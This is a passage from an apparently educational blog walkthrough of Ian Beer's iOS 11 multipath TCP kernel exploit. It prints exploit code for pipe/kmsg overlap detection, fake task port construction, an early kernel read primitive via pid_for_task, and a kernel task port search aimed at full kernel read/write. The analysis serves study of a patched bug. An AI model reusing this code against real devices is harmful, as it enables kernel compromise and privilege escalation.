class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br /></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></pre></td> \n      <td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">int</span> <span class=\"title\">find_replacer_pipe</span><span class=\"params\">(<span class=\"keyword\">void</span>** contents)</span> </span>{</span><br><span class=\"line\">  <span class=\"keyword\">uint64_t</span>* read_back = <span class=\"built_in\">malloc</span>(PIPE_SIZE);</span><br><span class=\"line\">  <span class=\"keyword\">for</span> (<span class=\"keyword\">int</span> i = <span class=\"number\">0</span>; i &lt; next_read_fd; i++) {</span><br><span class=\"line\">    <span class=\"keyword\">int</span> fd = read_fds[i];</span><br><span class=\"line\">    <span class=\"keyword\">ssize_t</span> amount = read(fd, read_back, PIPE_SIZE);</span><br><span class=\"line\"> <span class=\"keyword\">if</span> (amount != PIPE_SIZE) {</span><br><span class=\"line\"> <span class=\"built_in\">printf</span>(<span class=\"string\">\"short read (%ld)\\n\"</span>, amount);</span><br><span class=\"line\"> } <span class=\"keyword\">else</span> {</span><br><span class=\"line\"> <span class=\"built_in\">printf</span>(<span class=\"string\">\"full read\\n\"</span>);</span><br><span class=\"line\"> }</span><br><span class=\"line\"> </span><br><span class=\"line\"> <span class=\"keyword\">int</span> pipe_is_replacer = <span class=\"number\">0</span>;</span><br><span class=\"line\"> <span class=\"keyword\">for</span> (<span class=\"keyword\">int</span> j = <span class=\"number\">0</span>; j &lt; PIPE_SIZE/<span class=\"number\">8</span>; j++) {</span><br><span class=\"line\"> <span class=\"keyword\">if</span> (read_back[j] != <span class=\"number\">0x4242424242424242</span>) { <span class=\"comment\">// Is the content still \"BBBBBBBB\"?</span></span><br><span class=\"line\"> pipe_is_replacer = <span class=\"number\">1</span>;</span><br><span class=\"line\"> <span class=\"built_in\">printf</span>(<span class=\"string\">\"found an unexpected value: %016llx\\n\"</span>, read_back[j]);</span><br><span class=\"line\"> }</span><br><span class=\"line\"> }</span><br><span class=\"line\"> </span><br><span class=\"line\"> <span class=\"keyword\">if</span> (pipe_is_replacer) {</span><br><span class=\"line\"> *contents = read_back;</span><br><span class=\"line\"> <span class=\"keyword\">return</span> fd;</span><br><span class=\"line\"> }</span><br><span class=\"line\"> }</span><br><span class=\"line\"> <span class=\"keyword\">return</span> <span class=\"number\">-1</span>;</span><br><span class=\"line\">}</span><br /></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></pre></td> \n     </tr> \n    </table> \n   </figure></br></p> \n <p>The technique Ian Beer used here is just to read from each pipe, and compare the content read with the original data we piped into the buffer, <code>BBBBBBBBB</code> (0x4242424242 in hex). If different, that means the underlying buffer has been overwritten by a newly allocated <code>ipc_kmsg</code>.</p> \n <p>If we can’t find a pipe satisfying this condition it simply means there is no overlapping, and we just have to restart and wish ourselves better luck next time.</p> \n <p><img src=\"http://keenlab.tencent.com/en/img/Exploiting-iOS-11-0-11-3-1-Multi-path-TCP-A-walk-through/ScreenShot2018-07-11at6-8b337252-8801-4c79-a571-86b83d0769d4.22.03PM.png\" alt=\"\" /></p> \n <h1 id=\"Catching-the-port\"><a href=\"http://keenlab.tencent.com/2018/07/19/Exploiting-iOS-11-0-11-3-1-Multi-path-TCP-A-walk-through/#Catching-the-port\" class=\"headerlink\" title=\"Catching the port\"></a>Catching the port</h1> \n <p>Now, we need to figure out which port owns the preallocated <code>ipc_kmsg</code> buffer. To do that, we need to somehow persuade the kernel into overwriting <code>prealloced kmsg</code> with something different so that we can compare the content again and spot the difference.</p> \n <p>Ian Beer’s technique in the PoC is to register each port as an exception port for a thread and intentionally raise an exception on the thread, causing the kernel to send a <code>kmsg</code> to the buffer, then immediately compares the content by reading from the pipe. This is ingenious.</p> \n <pre><code>for (int i = 0; i &lt; 100; i++) {    send_prealloc_msg(exception_ports[i]);    // read from the pipe and see if the contents changed:</code></pre> \n <p>Let’s walk through <code>send_prealloc_msg()</code> step by step.</p> \n <h2 id=\"1-Start-a-thread\"><a href=\"http://keenlab.tencent.com/2018/07/19/Exploiting-iOS-11-0-11-3-1-Multi-path-TCP-A-walk-through/#1-Start-a-thread\" class=\"headerlink\" title=\"1. Start a thread\"></a>1. Start a thread</h2> \n <pre><code>pthread_create(&amp;t, NULL, do_thread, (void*)port);</code></pre> \n <h2 id=\"2-Register-exception-port\"><a href=\"http://keenlab.tencent.com/2018/07/19/Exploiting-iOS-11-0-11-3-1-Multi-path-TCP-A-walk-through/#2-Register-exception-port\" class=\"headerlink\" title=\"2. Register exception port\"></a>2. Register exception port</h2> \n <figure class=\"highlight c\"> \n  <table> \n   <tr> \n    <td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br /></br></br></br></br></br></br></br></br></br></pre></td> \n    <td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">void</span>* <span class=\"title\">do_thread</span><span class=\"params\">(<span class=\"keyword\">void</span>* arg)</span> </span>{</span><br><span class=\"line\">  <span class=\"keyword\">mach_port_t</span> exception_port = (<span class=\"keyword\">mach_port_t</span>)arg;</span><br><span class=\"line\">  </span><br><span class=\"line\">  <span class=\"keyword\">kern_return_t</span> err;</span><br><span class=\"line\">  err = thread_set_exception_ports(</span><br><span class=\"line\"> mach_thread_self(),</span><br><span class=\"line\"> EXC_MASK_ALL,</span><br><span class=\"line\"> exception_port,</span><br><span class=\"line\"> EXCEPTION_STATE_IDENTITY, <span class=\"comment\">// catch_exception_raise_state_identity messages</span></span><br><span class=\"line\"> ARM_THREAD_STATE64);</span><br /></br></br></br></br></br></br></br></br></br></pre></td> \n   </tr> \n  </table> \n </figure> \n <h2 id=\"3-Substitute-thread-port-with-a-host-port\"><a href=\"http://keenlab.tencent.com/2018/07/19/Exploiting-iOS-11-0-11-3-1-Multi-path-TCP-A-walk-through/#3-Substitute-thread-port-with-a-host-port\" class=\"headerlink\" title=\"3. Substitute thread port with a host port\"></a>3. Substitute thread port with a host port</h2> \n <figure class=\"highlight c\"> \n  <table> \n   <tr> \n    <td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br /></br></pre></td> \n    <td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// make the thread port which gets sent in the message actually be the host port</span></span><br><span class=\"line\">  err = thread_set_special_port(mach_thread_self(), THREAD_KERNEL_PORT, mach_host_self());</span><br /></br></pre></td> \n   </tr> \n  </table> \n </figure> \n <h2 id=\"4-Crash-the-thread\"><a href=\"http://keenlab.tencent.com/2018/07/19/Exploiting-iOS-11-0-11-3-1-Multi-path-TCP-A-walk-through/#4-Crash-the-thread\" class=\"headerlink\" title=\"4. Crash the thread\"></a>4. Crash the thread</h2> \n <figure class=\"highlight c\"> \n  <table> \n   <tr> \n    <td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br /></br></br></br></pre></td> \n    <td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// cause an exception message to be sent by the kernel</span></span><br><span class=\"line\">  <span class=\"keyword\">volatile</span> <span class=\"keyword\">char</span>* bAAAAd_ptr = (<span class=\"keyword\">volatile</span> <span class=\"keyword\">char</span>*)<span class=\"number\">0x41414141</span>;</span><br><span class=\"line\">  *bAAAAd_ptr = <span class=\"string\">'A'</span>;</span><br><span class=\"line\"><span class=\"comment\">// Now the thread is crashed</span></span><br /></br></br></br></pre></td> \n   </tr> \n  </table> \n </figure> \n <p>After the thread crashes, a message containing the exception information is sent to our <code>ipc_kmsg</code> buffer, waiting to be received and processed by the port. We can now read from the pipe and compare the content.<br> \n   <figure class=\"highlight c\"> \n    <table> \n     <tr> \n      <td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br /></br></br></br></br></br></br></br></br></br></br></br></br></br></pre></td> \n      <td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">ssize_t</span> amount = read(replacer_pipe, new_contents, PIPE_SIZE);</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (amount != PIPE_SIZE) {</span><br><span class=\"line\">      <span class=\"built_in\">printf</span>(<span class=\"string\">\"short read (%ld)\\n\"</span>, amount);</span><br><span class=\"line\">    }</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (<span class=\"built_in\">memcmp</span>(original_contents, new_contents, PIPE_SIZE) == <span class=\"number\">0</span>) {</span><br><span class=\"line\"> <span class=\"comment\">// they are still the same, this isn't the correct port:</span></span><br><span class=\"line\"> ...</span><br><span class=\"line\"> } <span class=\"keyword\">else</span> {</span><br><span class=\"line\"> <span class=\"comment\">// different! we found the right exception port which has its prealloced port overlapping</span></span><br><span class=\"line\"> replacer_port = exception_ports[i];</span><br><span class=\"line\"></span><br><span class=\"line\"> <span class=\"keyword\">break</span>;</span><br><span class=\"line\"> }</span><br><span class=\"line\"> }</span><br /></br></br></br></br></br></br></br></br></br></br></br></br></br></pre></td> \n     </tr> \n    </table> \n   </figure></br></p> \n <p>At this point, we have fully discovered the overlapping pipe, port pair.</p> \n <p>We also need to save the kernel address for the host port and our task port for later:<br> \n   <figure class=\"highlight c\"> \n    <table> \n     <tr> \n      <td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br /></br></br></br></br></pre></td> \n      <td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// We will get kernel ipc_space address from this later</span></span><br><span class=\"line\"><span class=\"keyword\">uint64_t</span> host_port_kaddr = *((<span class=\"keyword\">uint64_t</span>*)(new_contents + <span class=\"number\">0x66c</span>));</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// Need this for cleaning up mach port table</span></span><br><span class=\"line\"><span class=\"keyword\">uint64_t</span> task_port_kaddr = *((<span class=\"keyword\">uint64_t</span>*)(new_contents + <span class=\"number\">0x67c</span>));</span><br /></br></br></br></br></pre></td> \n     </tr> \n    </table> \n   </figure></br></p> \n <h1 id=\"Build-fake-task-port\"><a href=\"http://keenlab.tencent.com/2018/07/19/Exploiting-iOS-11-0-11-3-1-Multi-path-TCP-A-walk-through/#Build-fake-task-port\" class=\"headerlink\" title=\"Build fake task port\"></a>Build fake task port</h1> \n <p>Before we receive the exception message into user space, we want to build a fake task port to allow early kernel arbitray read. </p> \n <pre><code>build_fake_task_port(original_contents+fake_port_offset, fake_port_kaddr, early_read_pipe_buffer_kaddr, 0, 0);</code></pre> \n <p>We can do this by mimicking the structure of a proper task port:<br> \n   <figure class=\"highlight c\"> \n    <table> \n     <tr> \n      <td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br /></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></pre></td> \n      <td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> IO_BITS_ACTIVE 0x80000000</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> IKOT_TASK 2</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> IKOT_NONE 0</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">void</span> <span class=\"title\">build_fake_task_port</span><span class=\"params\">(<span class=\"keyword\">uint8_t</span>* fake_port, <span class=\"keyword\">uint64_t</span> fake_port_kaddr, <span class=\"keyword\">uint64_t</span> initial_read_addr, <span class=\"keyword\">uint64_t</span> vm_map, <span class=\"keyword\">uint64_t</span> receiver)</span> </span>{</span><br><span class=\"line\"> <span class=\"comment\">// clear the region we'll use:</span></span><br><span class=\"line\"> <span class=\"built_in\">memset</span>(fake_port, <span class=\"number\">0</span>, <span class=\"number\">0x500</span>);</span><br><span class=\"line\"> </span><br><span class=\"line\"> *(<span class=\"keyword\">uint32_t</span>*)(fake_port+koffset(KSTRUCT_OFFSET_IPC_PORT_IO_BITS)) = IO_BITS_ACTIVE | IKOT_TASK;</span><br><span class=\"line\"> *(<span class=\"keyword\">uint32_t</span>*)(fake_port+koffset(KSTRUCT_OFFSET_IPC_PORT_IO_REFERENCES)) = <span class=\"number\">0xf00d</span>; <span class=\"comment\">// leak references</span></span><br><span class=\"line\"> *(<span class=\"keyword\">uint32_t</span>*)(fake_port+koffset(KSTRUCT_OFFSET_IPC_PORT_IP_SRIGHTS)) = <span class=\"number\">0xf00d</span>; <span class=\"comment\">// leak srights</span></span><br><span class=\"line\"> *(<span class=\"keyword\">uint64_t</span>*)(fake_port+koffset(KSTRUCT_OFFSET_IPC_PORT_IP_RECEIVER)) = receiver;</span><br><span class=\"line\"> *(<span class=\"keyword\">uint64_t</span>*)(fake_port+koffset(KSTRUCT_OFFSET_IPC_PORT_IP_CONTEXT)) = <span class=\"number\">0x123456789abcdef</span>;</span><br><span class=\"line\"> </span><br><span class=\"line\"> </span><br><span class=\"line\"> <span class=\"keyword\">uint64_t</span> fake_task_kaddr = fake_port_kaddr + <span class=\"number\">0x100</span>;</span><br><span class=\"line\"> *(<span class=\"keyword\">uint64_t</span>*)(fake_port+koffset(KSTRUCT_OFFSET_IPC_PORT_IP_KOBJECT)) = fake_task_kaddr;</span><br><span class=\"line\"> </span><br><span class=\"line\"> ...</span><br><span class=\"line\">}</span><br /></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></pre></td> \n     </tr> \n    </table> \n   </figure></br></p> \n <p>and shoving it into our <code>ipc_kmsg</code> buffer with our <code>replacer_pipe</code>.<br> \n   <figure class=\"highlight c\"> \n    <table> \n     <tr> \n      <td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br /></br></br></br></br></br></br></pre></td> \n      <td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// the thread port is at +66ch</span></span><br><span class=\"line\">  <span class=\"comment\">// we could parse the kmsg properly, but this'll do...</span></span><br><span class=\"line\">  <span class=\"comment\">// replace the thread port pointer with one to our fake port:</span></span><br><span class=\"line\">  *((<span class=\"keyword\">uint64_t</span>*)(original_contents+<span class=\"number\">0x66c</span>)) = fake_port_kaddr;</span><br><span class=\"line\">  </span><br><span class=\"line\"> <span class=\"comment\">// replace the ipc_kmsg:</span></span><br><span class=\"line\"> write(pipe_write_end, original_contents, PIPE_SIZE);</span><br /></br></br></br></br></br></br></pre></td> \n     </tr> \n    </table> \n   </figure></br></p> \n <p>We can read off the kernel address of our buffer from the <code>next</code> field, which points back to the buffer itself given it is the only <code>ipc_kmsg</code> in the queue.<br> \n   <figure class=\"highlight c\"> \n    <table> \n     <tr> \n      <td class=\"gutter\"><pre><span class=\"line\">1</span><br /></pre></td> \n      <td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">uint64_t</span> pipe_buf = *((<span class=\"keyword\">uint64_t</span>*)(new_contents + <span class=\"number\">0x8</span>));</span><br /></pre></td> \n     </tr> \n    </table> \n   </figure></br></p> \n <p>Let’s zoom into our <code>ipc_kmsg</code> buffer to observe the change.</p> \n <p><img src=\"http://keenlab.tencent.com/en/img/Exploiting-iOS-11-0-11-3-1-Multi-path-TCP-A-walk-through/ScreenShot2018-07-12at5-f6b9fc4c-5035-4719-91d6-3796de3006e0.40.44PM.png\" alt=\"\" /></p> \n <p>Now, the thread_port points to our fake task port! Mission accomplished! </p> \n <p><strong>Note</strong>: Here, in this particular PoC, <code>*thread_port</code> actually points to a host port because in Step 3 of the previous section, we substitute the thread port with host port. By doing this, we have a leaked host port kernel address, which can be used to obtain kernel’s <code>ipc_space</code> later. We will cover this shortly.</p> \n <h1 id=\"Receive-the-exception-message\"><a href=\"http://keenlab.tencent.com/2018/07/19/Exploiting-iOS-11-0-11-3-1-Multi-path-TCP-A-walk-through/#Receive-the-exception-message\" class=\"headerlink\" title=\"Receive the exception message\"></a>Receive the exception message</h1> \n <p>User space programs can receive the exception message by a callout to system exception server, <code>exc_server</code>, after which various port rights in the <code>ipc_kmsg</code> will be inserted into calling task’s <code>ipc_space</code>, including our fake task port’s send right (which is really supposed to be a thread port).</p> \n <p>We can now simply extract the port name to the fake port from the exception handler callback, from the <code>thread</code> argument:<br> \n   <figure class=\"highlight c\"> \n    <table> \n     <tr> \n      <td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br /></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></pre></td> \n      <td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">kern_return_t</span> catch_exception_raise_state_identity</span><br><span class=\"line\">(</span><br><span class=\"line\"> <span class=\"keyword\">mach_port_t</span> exception_port,</span><br><span class=\"line\"> <span class=\"keyword\">mach_port_t</span> thread,</span><br><span class=\"line\"> <span class=\"keyword\">mach_port_t</span> task,</span><br><span class=\"line\"> <span class=\"keyword\">exception_type_t</span> exception,</span><br><span class=\"line\"> <span class=\"keyword\">exception_data_t</span> code,</span><br><span class=\"line\"> <span class=\"keyword\">mach_msg_type_number_t</span> codeCnt,</span><br><span class=\"line\"> <span class=\"keyword\">int</span> *flavor,</span><br><span class=\"line\"> <span class=\"keyword\">thread_state_t</span> old_state,</span><br><span class=\"line\"> <span class=\"keyword\">mach_msg_type_number_t</span> old_stateCnt,</span><br><span class=\"line\"> <span class=\"keyword\">thread_state_t</span> new_state,</span><br><span class=\"line\"> <span class=\"keyword\">mach_msg_type_number_t</span> *new_stateCnt</span><br><span class=\"line\"> )</span><br><span class=\"line\">{</span><br><span class=\"line\"> <span class=\"built_in\">printf</span>(<span class=\"string\">\"catch_exception_raise_state_identity\\n\"</span>);</span><br><span class=\"line\"> </span><br><span class=\"line\"> </span><br><span class=\"line\"> </span><br><span class=\"line\"> <span class=\"comment\">// the thread port isn't actually the thread port</span></span><br><span class=\"line\"> <span class=\"comment\">// we rewrote it via the pipe to be the fake kernel r/w port</span></span><br><span class=\"line\"> <span class=\"built_in\">printf</span>(<span class=\"string\">\"thread: %x\\n\"</span>, thread);</span><br><span class=\"line\"> extracted_thread_port = thread;</span><br><span class=\"line\"> </span><br><span class=\"line\"> mach_port_deallocate(mach_task_self(), task);</span><br><span class=\"line\"> </span><br><span class=\"line\"> <span class=\"comment\">// make the thread exit cleanly when it resumes:</span></span><br><span class=\"line\"> <span class=\"built_in\">memcpy</span>(new_state, old_state, <span class=\"keyword\">sizeof</span>(_STRUCT_ARM_THREAD_STATE64));</span><br><span class=\"line\"> _STRUCT_ARM_THREAD_STATE64* <span class=\"keyword\">new</span> = (_STRUCT_ARM_THREAD_STATE64*)(new_state);</span><br><span class=\"line\"> </span><br><span class=\"line\"> *new_stateCnt = old_stateCnt;</span><br><span class=\"line\"> </span><br><span class=\"line\"> <span class=\"keyword\">new</span>-&gt;__pc = (<span class=\"keyword\">uint64_t</span>)pthread_exit;</span><br><span class=\"line\"> <span class=\"keyword\">new</span>-&gt;__x[<span class=\"number\">0</span>] = <span class=\"number\">0</span>;</span><br><span class=\"line\"> </span><br><span class=\"line\"> <span class=\"comment\">// let the thread resume and exit</span></span><br><span class=\"line\"> <span class=\"keyword\">return</span> KERN_SUCCESS;</span><br><span class=\"line\">}</span><br /></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></pre></td> \n     </tr> \n    </table> \n   </figure></br></p> \n <p>At this point, we have successfully inserted a fake task port into our task’s <code>ipc_space</code>. Isn’t this ingenious? </p> \n <h1 id=\"Build-early-kernel-read-primitive\"><a href=\"http://keenlab.tencent.com/2018/07/19/Exploiting-iOS-11-0-11-3-1-Multi-path-TCP-A-walk-through/#Build-early-kernel-read-primitive\" class=\"headerlink\" title=\"Build early kernel read primitive\"></a>Build early kernel read primitive</h1> \n <p>With the fake task port we can build an early kernel read primitive by using <code>pid_for_task()</code>.</p> \n <p>Given a valid task port, <code>pid_for_task()</code> simply get a <code>task</code> pointer from port’s <code>ip_kobject</code>, deference and retrieve the <code>proc</code> pointer from task’s <code>bsd_info</code> , dereference again the <code>proc</code> struct and get the pid from it. Since all it does is just some pointer arithmetic and dereferencing, we can just create a fake task struct inside the <code>ipc_kmsg</code> we control, work backward and place the kernel address we would like to read at the correct offset.<br> \n   <figure class=\"highlight c\"> \n    <table> \n     <tr> \n      <td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br /></br></br></br></pre></td> \n      <td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">uint8_t</span>* fake_task = fake_port + <span class=\"number\">0x100</span>;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// set the bsd_info pointer to be 0x10 bytes before the desired initial read:</span></span><br><span class=\"line\">*(<span class=\"keyword\">uint64_t</span>*)(fake_task + koffset(KSTRUCT_OFFSET_TASK_BSD_INFO)) = initial_read_addr - <span class=\"number\">0x10</span>;</span><br /></br></br></br></pre></td> \n     </tr> \n    </table> \n   </figure></br></p> \n <p>With every call to <code>early_rk32</code>, we just need to rebuild the task port, fixing the <code>bsd_info</code> pointer address accordingly:</p> \n <p><img src=\"http://keenlab.tencent.com/en/img/Exploiting-iOS-11-0-11-3-1-Multi-path-TCP-A-walk-through/ScreenShot2018-07-12at5-2206d15a-141d-42f8-837c-8550f78837ad.40.10PM.png\" alt=\"\" /></p> \n <p>Here, unsurprisingly, <code>0x10</code> is just the offset of the <code>p_pid</code> field inside <code>struct proc</code>, as evident in <code>proc_internal.h</code>:<br> \n   <figure class=\"highlight c\"> \n    <table> \n     <tr> \n      <td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br /></br></br></br></br></br></br></pre></td> \n      <td class=\"code\"><pre><span class=\"line\"><span class=\"class\"><span class=\"keyword\">struct</span><span class=\"title\">proc</span> {</span></span><br><span class=\"line\">LIST_ENTRY(proc) p_list;<span class=\"comment\">// Just two pointers, so size 0x10</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">pid_t</span>p_pid;<span class=\"comment\">// Offset 0x10</span></span><br><span class=\"line\"><span class=\"keyword\">void</span> * task;</span><br><span class=\"line\">...</span><br><span class=\"line\">}</span><br /></br></br></br></br></br></br></pre></td> \n     </tr> \n    </table> \n   </figure></br></p> \n <p>The drawback of this technique is that the read is limited to 32 bits, which is the size of a <code>pid_t</code>.</p> \n <h1 id=\"Build-full-kernel-read-write-primitive\"><a href=\"http://keenlab.tencent.com/2018/07/19/Exploiting-iOS-11-0-11-3-1-Multi-path-TCP-A-walk-through/#Build-full-kernel-read-write-primitive\" class=\"headerlink\" title=\"Build full kernel read/write primitive\"></a>Build full kernel read/write primitive</h1> \n <p>Notice that the <code>struct ipc_space *receiver</code> field in our fake port and an address space description, <code>vm_map_t map</code>, in our fake task is still missing. We can achieve full kernel read/write by filling in the address for <code>ipc_space_kernel</code> and kernel task’s <code>vm_map</code>.</p> \n <p>We can get the kernel <code>ipc_space</code> from the host port we obtained a while ago, with a known offset:<br> \n   <figure class=\"highlight c\"> \n    <table> \n     <tr> \n      <td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br /></br></pre></td> \n      <td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// receiver field</span></span><br><span class=\"line\"><span class=\"keyword\">uint64_t</span> ipc_space_kernel = early_rk64(host_port_kaddr + koffset(KSTRUCT_OFFSET_IPC_PORT_IP_RECEIVER));</span><br /></br></pre></td> \n     </tr> \n    </table> \n   </figure></br></p> \n <p>However, kernel’s <code>vm_map</code> is a bit trickier to get.</p> \n <p>Ian Beer’s approach takes the following steps:</p> \n <ol> \n  <li>Find the kernel task port on the heap</li> \n  <li>Get kernel’s task from task port</li> \n  <li>Get the <code>vm_map</code> form kernel task</li> \n </ol> \n <p>To find the kernel task port on the heap, we search in the vicinity of the host port for anything that looks like a task port and get the kernel task <code>vm_map</code> from it:<br> \n   <figure class=\"highlight c\"> \n    <table> \n     <tr> \n      <td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br /></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></pre></td> \n      <td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// now look through up to 0x4000 of ports and find one which looks like a task port:</span></span><br><span class=\"line\">  <span class=\"keyword\">for</span> (<span class=\"keyword\">int</span> i = <span class=\"number\">0</span>; i &lt; (<span class=\"number\">0x4000</span>/<span class=\"number\">0xa8</span>); i++) {</span><br><span class=\"line\">    <span class=\"keyword\">uint64_t</span> early_port_kaddr = first_port + (i*<span class=\"number\">0xa8</span>);</span><br><span class=\"line\">    <span class=\"keyword\">uint32_t</span> io_bits = early_rk32(early_port_kaddr + koffset(KSTRUCT_OFFSET_IPC_PORT_IO_BITS));</span><br><span class=\"line\">    </span><br><span class=\"line\"> <span class=\"keyword\">if</span> (io_bits != (IO_BITS_ACTIVE | IKOT_TASK)) {</span><br><span class=\"line\"> <span class=\"keyword\">continue</span>;</span><br><span class=\"line\"> }</span><br><span class=\"line\"> </span><br><span class=\"line\"> <span class=\"comment\">// get that port's kobject:</span></span><br><span class=\"line\"> <span class=\"keyword\">uint64_t</span> <span class=\"keyword\">task_t</span> = early_rk64(early_port_kaddr + koffset(KSTRUCT_OFFSET_IPC_PORT_IP_KOBJECT));</span><br><span class=\"line\"> <span class=\"keyword\">if</span> (<span class=\"keyword\">task_t</span> == <span class=\"number\">0</span>) {</span><br><span class=\"line\"> <span class=\"built_in\">printf</span>(<span class=\"string\">\"weird heap object with NULL 